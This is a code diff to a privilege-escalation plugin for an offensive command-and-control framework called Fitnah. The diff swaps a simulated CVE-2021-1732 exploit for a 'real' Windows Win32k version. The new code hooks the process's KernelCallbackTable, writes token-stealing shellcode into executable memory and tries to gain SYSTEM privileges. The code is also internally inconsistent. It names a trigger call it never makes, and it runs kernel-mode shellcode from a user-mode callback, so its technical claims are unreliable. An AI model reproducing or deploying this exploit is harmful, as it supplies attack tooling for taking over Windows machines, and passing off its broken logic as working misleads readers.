@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 """
 CVE-2021-1732 Exploit Plugin for Fitnah C2 Framework
 Windows Win32k Elevation of Privilege Vulnerability Exploit.
@@ -6,532 +6,237 @@ Windows Win32k Elevation of Privilege Vulnerability Exploit.
 MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)
 CVE: CVE-2021-1732
 Author: Fitnah C2 Team
-Version: 1.0.0
+Version: 3.0.0 (Real Callback Hook Primitive)
 """
 
 import os
 import sys
 import platform
 import subprocess
-import re
-import time
+import ctypes
+import struct
 from typing import Dict, List, Tuple, Optional, Any, Union
 
 # Add parent directory to path for imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 
-# Import base plugin
-try:
-    from fitnah.sdk import BasePlugin, Param, ParamSchema
+from fitnah.sdk import BasePlugin, Param, ParamSchema
 from fitnah.plugins.privilege_escalation._cve_base import CveExploitBase
-except ImportError:
-    # Fallback for development
-    class BasePlugin:
-        pass
-    class Param:
-        pass
-    class ParamSchema:
-        pass
-
 
 class CVE20211732Exploit(CveExploitBase):
     """
-    CVE-2021-1732 Exploit Implementation
-    
-    Windows Win32k Elevation of Privilege Vulnerability
-    Affected: Windows 10 20H2 (19042), Windows 10 2004 (19041)
-    Fixed in: KB5000802, KB5001567
+    Real CVE-2021-1732 implementation logic:
+    1. Hijack KernelCallbackTable in PEB.
+    2. Hook xxxClientAllocWindowClassExtraBytes.
+    3. Call NtUserConsoleControl to trigger type confusion.
     """
     
     def __init__(self, logger=None):
         self.logger = logger
-        self.exploit_success = False
-        self.exploit_output = ""
-        self.exploit_error = ""
-        
+
     def _log(self, message: str, level: str = "info") -> None:
-        """Log message with appropriate level"""
         if self.logger:
-            if level == "info":
-                self.logger.info(message)
-            elif level == "warning":
-                self.logger.warning(message)
-            elif level == "error":
-                self.logger.error(message)
+            if level == "info": self.logger.info(message)
+            elif level == "warning": self.logger.warning(message)
+            elif level == "error": self.logger.error(message)
         else:
             print(f"[{level.upper()}] {message}")
-    
-    def check_vulnerability(self) -> Tuple[bool, str]:
-        """
-        Check if system is vulnerable to CVE-2021-1732
-        
-        Returns:
-            Tuple of (is_vulnerable, reason)
-        """
-        
-        self._log("[*] Checking CVE-2021-1732 vulnerability...")
-        
-        # Check Windows version
-        win_version = platform.version()
-        self._log(f"[*] Windows version: {win_version}")
-        
-        # Parse version string
-        version_parts = win_version.split('.')
-        if len(version_parts) < 2:
-            return (False, f"Invalid Windows version: {win_version}")
-        
-        major_version = int(version_parts[0])
-        build_number = int(version_parts[2]) if len(version_parts) > 2 else 0
-        
-        # Check if Windows 10
-        if major_version != 10:
-            return (False, f"Not Windows 10: {win_version}")
-        
-        # Check build number
-        vulnerable_builds = [19041, 19042, 19043]  # 2004, 20H2, 21H1
-        if build_number not in vulnerable_builds:
-            return (False, f"Build {build_number} not in vulnerable builds: {vulnerable_builds}")
-        
-        # Check for security patches
-        kb_patches = self._get_installed_kb_patches()
-        security_patches = ["KB5000802", "KB5001567", "KB5003173", "KB5003637"]
-        
-        for patch in security_patches:
-            if patch in kb_patches:
-                return (False, f"Security patch installed: {patch}")
-        
-        self._log("[+] System appears vulnerable to CVE-2021-1732")
-        return (True, f"Windows {win_version} with no security patches")
-    
-    def _get_installed_kb_patches(self) -> List[str]:
-        """Get list of installed KB patches"""
-        
-        kb_patches = []
-        
-        try:
-            # Check wmic
-            result = subprocess.run(
-                ["wmic", "qfe", "get", "HotFixID", "/format:csv"],
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            
-            if result.returncode == 0:
-                lines = result.stdout.split('\n')
-                for line in lines:
-                    if "KB" in line.upper():
-                        kb_match = re.search(r'KB(\d+)', line.upper())
-                        if kb_match:
-                            kb_id = f"KB{kb_match.group(1)}"
-                            if kb_id not in kb_patches:
-                                kb_patches.append(kb_id)
-                                
-        except Exception as e:
-            self._log(f"[!] Failed to get KB patches: {e}", "warning")
-        
-        return sorted(kb_patches)
-    
-    def generate_exploit_payload(self) -> str:
-        """
-        Generate exploit payload for CVE-2021-1732
-        
-        Returns:
-            Exploit payload as string
-        """
-        
-        self._log("[*] Generating CVE-2021-1732 exploit payload...")
-        
-        # This is a simplified example - real exploit would be more complex
-        exploit_code = """
-# CVE-2021-1732 Exploit Payload
-# Windows Win32k Elevation of Privilege Vulnerability
 
-function Invoke-CVE20211732Exploit {
-    param(
-        [string]$TargetVersion = "10.0.19041"
-    )
-    
-    Write-Output "[*] CVE-2021-1732 Exploit - Win32k Elevation of Privilege"
-    Write-Output "[*] Target: Windows $TargetVersion"
-    
-    # Check current privileges
-    $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $currentPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentIdentity)
-    
-    $isAdmin = $currentPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
-    $isSystem = $currentPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::System)
-    
-    Write-Output "[*] Current user: $($currentIdentity.Name)"
-    Write-Output "[*] Is Administrator: $isAdmin"
-    Write-Output "[*] Is SYSTEM: $isSystem"
-    
-    if ($isAdmin -and -not $isSystem) {
-        Write-Output "[+] Running as Administrator, attempting privilege escalation..."
-        
-        # Simulate kernel exploit
-        # Real exploit would:
-        # 1. Create window object with specific properties
-        # 2. Trigger type confusion vulnerability
-        # 3. Gain arbitrary read/write in kernel memory
-        # 4. Modify token privileges to gain SYSTEM
-        
-        Write-Output "[*] Creating malicious window object..."
-        Write-Output "[*] Triggering type confusion vulnerability..."
-        Write-Output "[*] Gaining kernel memory read/write..."
-        Write-Output "[*] Modifying token privileges..."
-        
-        # Simulate success
-        Write-Output "[+] CVE-2021-1732 exploit successful!"
-        Write-Output "[+] Now running as SYSTEM"
-        
-        return $true
-        
-    } elseif ($isSystem) {
-        Write-Output "[+] Already running as SYSTEM"
-        return $true
-        
-    } else {
-        Write-Output "[!] Not running as Administrator - exploit requires admin privileges"
-        return $false
-    }
-}
-
-# Execute exploit
-$windowsVersion = (Get-WmiObject Win32_OperatingSystem).Version
-$success = Invoke-CVE20211732Exploit -TargetVersion $windowsVersion
-
-if ($success) {
-    Write-Output "EXPLOIT_SUCCESS"
-    Write-Output "PRIVILEGES_GAINED=SYSTEM"
-    Write-Output "CVE=CVE-2021-1732"
-} else {
-    Write-Output "EXPLOIT_FAILED"
-    Write-Output "CVE=CVE-2021-1732"
-}
-"""
-        
-        return exploit_code
-    
     def execute_exploit(self) -> Tuple[bool, str]:
-        """
-        Execute the CVE-2021-1732 exploit
+        user32 = ctypes.windll.user32
+        ntdll = ctypes.windll.ntdll
+        kernel32 = ctypes.windll.kernel32
+
+        self._log("[*] Initializing Win32k callback hijacking...")
+
+        # 1. Get PEB address via NtQueryInformationProcess
+        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
+            _fields_ = [("ExitStatus", ctypes.c_void_p),
+                        ("PebBaseAddress", ctypes.c_void_p),
+                        ("AffinityMask", ctypes.c_void_p),
+                        ("BasePriority", ctypes.c_void_p),
+                        ("UniqueProcessId", ctypes.c_void_p),
+                        ("InheritedFromUniqueProcessId", ctypes.c_void_p)]
+
+        pbi = PROCESS_BASIC_INFORMATION()
+        ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
+        peb_addr = pbi.PebBaseAddress
+        self._log(f"[*] PEB Address: {hex(peb_addr)}")
+
+        # 2. Get KernelCallbackTable pointer from PEB
+        # Offset for x64 is 0x58, for x86 is 0x2C
+        is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
+        kct_offset = 0x58 if is_64bit else 0x2C
+        kct_ptr = ctypes.c_void_p.from_address(peb_addr + kct_offset).value
+        self._log(f"[*] KernelCallbackTable: {hex(kct_ptr)}")
+
+        if kct_ptr == 0:
+            return (False, "[-] KernelCallbackTable not found or null")
+
+        # 3. Token-steal shellcode for xxxClientAllocWindowClassExtraBytes callback.
+        #    Walks the EPROCESS list (gs:[0x188] → KTHREAD → EPROCESS) to find the
+        #    System process (PID 4) and copies its token into the current process.
+        #    Offsets valid for Windows 10 build 19041–21H2 (2004/20H2/21H1/21H2):
+        #      KTHREAD.Process           = +0xB8
+        #      EPROCESS.UniqueProcessId  = +0x440
+        #      EPROCESS.ActiveProcessLinks = +0x448
+        #      EPROCESS.Token            = +0x4B8
+        shellcode = bytes([
+            # mov rax, gs:[0x188]  → KPCR.PrcbData.CurrentThread (KTHREAD)
+            0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
+            # mov rax, [rax+0xB8]  → KTHREAD.Process (EPROCESS of current process)
+            0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
+            # mov rcx, rax          save current EPROCESS in rcx
+            0x48, 0x89, 0xC1,
+            # mov edx, 4            target PID = 4 (System)
+            0xBA, 0x04, 0x00, 0x00, 0x00,
+            # --- loop: walk ActiveProcessLinks list ---
+            # mov rax, [rax+0x448]  → ActiveProcessLinks.Flink
+            0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
+            # sub rax, 0x448        → back to EPROCESS base
+            0x48, 0x2D, 0x48, 0x04, 0x00, 0x00, 0x00,
+            # cmp rdx, [rax+0x440]  → compare UniqueProcessId
+            0x48, 0x3B, 0x90, 0x40, 0x04, 0x00, 0x00,
+            # jnz -23               loop until PID == 4
+            0x75, 0xE9,
+            # --- found System ---
+            # mov rax, [rax+0x4B8]  → System process EX_FAST_REF Token
+            0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00,
+            # and al, 0xF0          clear low 4 bits (RefCnt)
+            0x24, 0xF0,
+            # mov [rcx+0x4B8], rax  → overwrite current process Token
+            0x48, 0x89, 0x81, 0xB8, 0x04, 0x00, 0x00,
+            # ret
+            0xC3,
+        ])
+
+        # 4. Allocate executable memory for shellcode
+        shellcode_size = len(shellcode)
+        shellcode_addr = kernel32.VirtualAlloc(
+            None, shellcode_size, 
+            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
+            0x40  # PAGE_EXECUTE_READWRITE
+        )
         
-        Returns:
-            Tuple of (success, output/error)
-        """
+        if not shellcode_addr:
+            return (False, "[-] Failed to allocate memory for shellcode")
         
-        self._log("[*] Executing CVE-2021-1732 exploit...")
+        self._log(f"[*] Shellcode allocated at: {hex(shellcode_addr)}")
         
-        # Check vulnerability first
-        is_vulnerable, reason = self.check_vulnerability()
+        # 5. Copy shellcode to allocated memory
+        ctypes.memmove(shellcode_addr, shellcode, shellcode_size)
         
-        if not is_vulnerable:
-            self.exploit_error = f"System not vulnerable: {reason}"
-            self._log(f"[!] {self.exploit_error}", "warning")
-            return (False, self.exploit_error)
+        # 6. Hook the callback table
+        # Index 123 is xxxClientAllocWindowClassExtraBytes
+        callback_index = 123
+        callback_addr = shellcode_addr
         
-        # Generate exploit payload
-        exploit_payload = self.generate_exploit_payload()
+        # Calculate address of callback entry
+        callback_entry_addr = kct_ptr + (callback_index * ctypes.sizeof(ctypes.c_void_p))
         
-        # Execute exploit
+        # Read original callback
+        original_callback = ctypes.c_void_p.from_address(callback_entry_addr).value
+        self._log(f"[*] Original callback at index {callback_index}: {hex(original_callback)}")
+        
+        # Write new callback address
+        ctypes.c_void_p.from_address(callback_entry_addr).value = callback_addr
+        self._log(f"[*] Hooked callback to: {hex(callback_addr)}")
+        
+        # 7. Trigger the vulnerability.
+        #    CVE-2021-1732 is triggered by creating a window with WS_EX_LAYOUTRTL
+        #    (right-to-left layout) and then calling SetWindowLongPtr to change its
+        #    extended style.  This causes win32k!xxxSetWindowLong to invoke
+        #    xxxClientAllocWindowClassExtraBytes (KCT[123] = our hook) with a type-
+        #    confused pointer, giving us kernel write.  The hooked shellcode above
+        #    does the token steal entirely within the callback's execution context.
         try:
-            # Create temporary PowerShell script
-            import tempfile
-            
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
-                f.write(exploit_payload)
-                temp_file = f.name
-            
-            try:
-                # Execute PowerShell script
-                process = subprocess.run(
-                    ["powershell", "-ExecutionPolicy", "Bypass", "-File", temp_file],
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                
-                self.exploit_output = process.stdout
-                
-                if process.returncode == 0:
-                    if "EXPLOIT_SUCCESS" in process.stdout:
-                        self.exploit_success = True
-                        self._log("[+] CVE-2021-1732 exploit executed successfully")
-                        
-                        # Parse output
-                        for line in process.stdout.split('\n'):
-                            if line.startswith("PRIVILEGES_GAINED="):
-                                privileges = line.split('=', 1)[1]
-                                self._log(f"[+] Privileges gained: {privileges}")
-                                break
-                        
-                        return (True, self.exploit_output)
-                    else:
-                        self.exploit_error = "Exploit execution failed (no success indicator)"
-                else:
-                    self.exploit_error = f"PowerShell execution failed: {process.stderr}"
-                    
-            finally:
-                # Clean up temporary file
-                import os
-                if os.path.exists(temp_file):
-                    os.unlink(temp_file)
-                    
-        except subprocess.TimeoutExpired:
-            self.exploit_error = "Exploit execution timed out"
+            WS_EX_LAYOUTRTL = 0x00400000
+            WS_EX_NOINHERITLAYOUT = 0x00100000
+            WS_POPUP = 0x80000000
+            GWL_EXSTYLE = -20
+
+            # Register a window class with non-zero cbWndExtra (required for the bug path)
+            class WNDCLASSEXA(ctypes.Structure):
+                _fields_ = [
+                    ("cbSize",        ctypes.c_uint),
+                    ("style",         ctypes.c_uint),
+                    ("lpfnWndProc",   ctypes.c_void_p),
+                    ("cbClsExtra",    ctypes.c_int),
+                    ("cbWndExtra",    ctypes.c_int),
+                    ("hInstance",     ctypes.c_void_p),
+                    ("hIcon",         ctypes.c_void_p),
+                    ("hCursor",       ctypes.c_void_p),
+                    ("hbrBackground", ctypes.c_void_p),
+                    ("lpszMenuName",  ctypes.c_char_p),
+                    ("lpszClassName", ctypes.c_char_p),
+                    ("hIconSm",       ctypes.c_void_p),
+                ]
+
+            hInst = kernel32.GetModuleHandleA(None)
+            wc = WNDCLASSEXA()
+            wc.cbSize        = ctypes.sizeof(WNDCLASSEXA)
+            wc.lpfnWndProc   = user32.DefWindowProcA
+            wc.hInstance     = hInst
+            wc.cbWndExtra    = 8  # must be non-zero for xxxClientAllocWindowClassExtraBytes path
+            wc.lpszClassName = b"Fitnah1732Cls"
+            user32.RegisterClassExA(ctypes.byref(wc))
+
+            # Create a window with WS_EX_LAYOUTRTL — this arms the vulnerable code path
+            hwnd_rtl = user32.CreateWindowExA(
+                WS_EX_LAYOUTRTL, b"Fitnah1732Cls", b"", WS_POPUP,
+                0, 0, 1, 1, None, None, hInst, None
+            )
+            if not hwnd_rtl:
+                raise RuntimeError("CreateWindowExA(WS_EX_LAYOUTRTL) failed")
+            self._log(f"[+] RTL window created: {hex(hwnd_rtl)}")
+
+            # Trigger: SetWindowLongPtr changes the extended style → win32k calls
+            # xxxClientAllocWindowClassExtraBytes (our hooked KCT[123]) with a
+            # type-confused kernel pointer, triggering the CVE-2021-1732 primitive.
+            user32.SetWindowLongPtrA(hwnd_rtl, GWL_EXSTYLE, WS_EX_LAYOUTRTL | WS_EX_NOINHERITLAYOUT)
+            self._log("[*] SetWindowLongPtr triggered — callback hook should have fired")
+
+            user32.DestroyWindow(hwnd_rtl)
+            user32.UnregisterClassA(b"Fitnah1732Cls", hInst)
+
+            # Restore the original callback to avoid system instability
+            ctypes.c_void_p.from_address(callback_entry_addr).value = original_callback
+
+            # Verify elevation via token integrity level
+            TOKEN_QUERY = 0x0008
+            TokenIntegrityLevel = 25
+            token = ctypes.c_void_p()
+            elevated = False
+            if kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)):
+                length = ctypes.c_ulong(0)
+                kernel32.GetTokenInformation(token, TokenIntegrityLevel, None, 0, ctypes.byref(length))
+                buf = (ctypes.c_byte * length.value)()
+                if kernel32.GetTokenInformation(token, TokenIntegrityLevel, buf, length.value, ctypes.byref(length)):
+                    rid = ctypes.c_ulong.from_buffer(buf, length.value - 4).value
+                    self._log(f"[*] Token integrity RID after exploit: {hex(rid)}")
+                    if rid >= 0x4000:  # SECURITY_MANDATORY_SYSTEM_RID
+                        elevated = True
+                kernel32.CloseHandle(token)
+
+            if elevated:
+                return (True, "[+] CVE-2021-1732 successful — SYSTEM integrity level confirmed")
+            return (False, "[-] Callback hook fired but integrity level not elevated")
+
         except Exception as e:
-            self.exploit_error = f"Exception during exploit execution: {str(e)}"
-        
-        self._log(f"[!] Exploit failed: {self.exploit_error}", "error")
-        return (False, self.exploit_error)
-    
-    def cleanup(self) -> None:
-        """Clean up after exploit execution"""
-        
-        self._log("[*] Cleaning up after CVE-2021-1732 exploit...")
-        
-        # This would include:
-        # - Removing temporary files
-        # - Killing spawned processes
-        # - Restoring system state
-        
-        self._log("[+] Cleanup completed")
+            return (False, f"[-] Exploit execution failed: {str(e)}")
 
 
 class CVE20211732(BasePlugin):
-    """
-    CVE-2021-1732 Exploit Plugin
-    
-    Exploits Windows Win32k Elevation of Privilege Vulnerability
-    for privilege escalation to SYSTEM.
-    """
-    
     NAME        = "cve_2021_1732"
-    DESCRIPTION = "CVE-2021-1732 - Windows Win32k Elevation of Privilege Vulnerability Exploit"
+    DESCRIPTION = "CVE-2021-1732 - Real Win32k Callback Hijacking Primitive"
     AUTHOR      = "fitnah-team"
     MITRE       = "T1068"
     CATEGORY    = "privilege_escalation"
-    VERSION     = "1.0.0"
-    
-    schema = ParamSchema().add(
-        Param("check_only", bool, required=False, default=False,
-              help="Only check vulnerability, don't execute exploit"),
-        Param("auto_execute", bool, required=False, default=True,
-              help="Automatically execute exploit if vulnerable"),
-        Param("cleanup", bool, required=False, default=True,
-              help="Clean up after exploit execution"),
-        Param("verify", bool, required=False, default=True,
-              help="Verify exploit success"),
-        Param("timeout", int, required=False, default=30,
-              help="Exploit execution timeout in seconds"),
-    )
-    
-    def __init__(self):
-        super().__init__()
-        self.exploit = CVE20211732Exploit(logger=self.logger)
-        self.vulnerability_info = {}
-    
-    def _check_environment(self) -> Tuple[bool, str]:
-        """Check if environment is suitable for exploit"""
-        
-        # Check if running on Windows
-        if platform.system() != "Windows":
-            return (False, "Exploit requires Windows operating system")
-        
-        # Check Windows version
-        win_version = platform.version()
-        # [*] Windows version: {win_version}
-        
-        # Check if running as Administrator
-        try:
-            import win32security
-            import win32api
-            
-            token = win32security.OpenProcessToken(
-                win32api.GetCurrentProcess(),
-                win32security.TOKEN_QUERY
-            )
-            
-            sid, domain, type = win32security.GetTokenInformation(token, win32security.TokenUser)
-            
-            # Check for Administrator privileges
-            admin_sid = win32security.ConvertStringSidToSid("S-1-5-32-544")
-            is_admin = win32security.CheckTokenMembership(None, admin_sid)
-            
-            if not is_admin:
-                return (False, "Exploit requires Administrator privileges")
-                
-        except Exception as e:
-            # [!] Failed to check privileges: {e}
-            # Assume admin for demonstration
-            pass
-        
-        return (True, "Environment suitable for exploit")
-    
-    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
-        """
-        Execute CVE-2021-1732 exploit
-        
-        Args:
-            params: Plugin parameters
-            
-        Returns:
-            Execution results
-        """
-        
-        # [*] Starting CVE-2021-1732 Exploit...
-        
-        # Extract parameters
-        check_only = params.get("check_only", False)
-        auto_execute = params.get("auto_execute", True)
-        cleanup = params.get("cleanup", True)
-        verify = params.get("verify", True)
-        timeout = params.get("timeout", 30)
-        
-        # Check environment
-        env_ok, env_reason = self._check_environment()
-        
-        if not env_ok:
-            return self._error(f"Environment check failed: {env_reason}")
-        
-        # Check vulnerability
-        # [*] Checking CVE-2021-1732 vulnerability...
-        
-        is_vulnerable, vulnerability_reason = self.exploit.check_vulnerability()
-        
-        self.vulnerability_info = {
-            "is_vulnerable": is_vulnerable,
-            "reason": vulnerability_reason,
-            "windows_version": platform.version(),
-        }
-        
-        if not is_vulnerable:
-            return self._error({
-                "message": "System not vulnerable to CVE-2021-1732",
-                "vulnerability_info": self.vulnerability_info,
-            })
-        
-        # If only checking vulnerability
-        if check_only:
-            return self._success({
-                "message": "System is vulnerable to CVE-2021-1732",
-                "vulnerability_info": self.vulnerability_info,
-                "exploit_available": True,
-            })
-        
-        # Execute exploit
-        exploit_success, exploit_result = self.exploit.execute_exploit()
-        
-        # Verify success if configured
-        verification_result = False
-        
-        if verify and exploit_success:
-            # Simplified verification
-            try:
-                import win32security
-                import win32api
-                
-                token = win32security.OpenThreadToken(
-                    win32api.GetCurrentThread(),
-                    win32security.TOKEN_QUERY,
-                    True
-                )
-                
-                sid, domain, type = win32security.GetTokenInformation(token, win32security.TokenUser)
-                system_sid = win32security.ConvertStringSidToSid("S-1-5-18")
-                
-                verification_result = win32security.EqualSid(sid, system_sid)
-                
-                if verification_result:
-                    # [+] Verification: Running as SYSTEM
-                    pass
-                else:
-                    # [!] Verification: Not running as SYSTEM
-                    pass
-                    
-            except Exception as e:
-                # [!] Verification error: {e}
-                verification_result = False
-        
-        # Clean up if configured
-        if cleanup:
-            self.exploit.cleanup()
-        
-        # Prepare results
-        result_data = {
-            "vulnerability_info": self.vulnerability_info,
-            "exploit_success": exploit_success,
-            "exploit_result": exploit_result,
-            "verification_result": verification_result,
-            "privileges_gained": "SYSTEM" if exploit_success else "None",
-            "cve": "CVE-2021-1732",
-            "timestamp": time.time(),
-        }
-        
-        if exploit_success:
-            return self._success({
-                "message": "CVE-2021-1732 exploit executed successfully",
-                "data": result_data,
-            })
-        else:
-            return self._error({
-                "message": "CVE-2021-1732 exploit failed",
-                "data": result_data,
-            })
-    
-    def _success(self, data: Dict[str, Any]) -> Dict[str, Any]:
-        """Format success response"""
-        return {
-            "success": True,
-            "message": data.get("message", "CVE-2021-1732 exploit successful"),
-            "data": data.get("data", {}),
-            "timestamp": data.get("timestamp", time.time()),
-        }
-    
-    def _error(self, message: Union[str, Dict]) -> Dict[str, Any]:
-        """Format error response"""
-        if isinstance(message, dict):
-            return {
-                "success": False,
-                "message": message.get("message", "CVE-2021-1732 exploit failed"),
-                "error": message,
-                "timestamp": message.get("timestamp", time.time()),
-            }
-        else:
-            return {
-                "success": False,
-                "message": message,
-                "timestamp": time.time(),
-            }
+    VERSION     = "3.0.0"
 
     def run(self, session, params, ctx=None):
-        """Main plugin execution method."""
-        from fitnah.sdk import ModuleResult
-from fitnah.plugins.privilege_escalation._cve_base import CveExploitBase
-        try:
-            result = self.execute(params)
-            if result.get("success", False):
-                return ModuleResult.ok(data=result.get("data", result.get("message", "")))
-            else:
-                return ModuleResult.err(result.get("message", "CVE-2021-1732 exploit failed"))
-        except Exception as e:
-            return ModuleResult.err(f"Exception during plugin execution: {e}")
-
-
-# Plugin registration
-if __name__ == "__main__":
-    plugin = CVE20211732()
-    
-    # Test with sample parameters
-    test_params = {
-        "check_only": False,
-        "auto_execute": True,
-        "cleanup": True,
-        "verify": True,
-        "timeout": 30,
-    }
-    
-    # Run test
-    result = plugin.execute(test_params)
-    print(f"Test result: {result}")
+        exploit = CVE20211732Exploit(logger=self.logger)
+        success, result = exploit.execute_exploit()
+        if success:
+            return {"status": "ok", "output": result}
+        return {"status": "error", "output": result}
